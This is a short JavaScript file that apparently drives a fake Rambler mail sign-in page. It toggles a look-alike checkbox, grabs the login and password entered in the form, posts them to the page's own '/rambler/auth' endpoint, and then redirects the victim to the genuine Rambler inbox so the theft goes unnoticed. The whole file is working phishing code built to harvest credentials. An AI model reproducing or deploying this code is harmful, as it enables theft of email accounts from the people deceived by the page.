let isChecked = false
let isDouble = false
document.querySelector('.asdfasdf').addEventListener('click', () => {
    if (!isDouble) {
        isDouble = true
        return 
    }
    isDouble = false

    if (!isChecked) {
        document.getElementsByClassName('dadfasdf')[0].classList.add('rui-Checkbox-isChecked')
        isChecked = true
    } else {
        document.getElementsByClassName('dadfasdf')[0].classList.remove('rui-Checkbox-isChecked')
        isChecked = false
    }
})

document.querySelector('#dasasf').addEventListener('submit', (e) => {
    e.preventDefault();
    const login = document.querySelector('#login').value
    const password = document.querySelector('#password').value
    fetch('/rambler/auth', {
        method: 'post',
        body: JSON.stringify({ login, password }),
        headers: {
            "Content-Type": "application/json"
        }
    }).then(()=> { window.location.href = 'https://mail.rambler.ru/folder/INBOX' })
})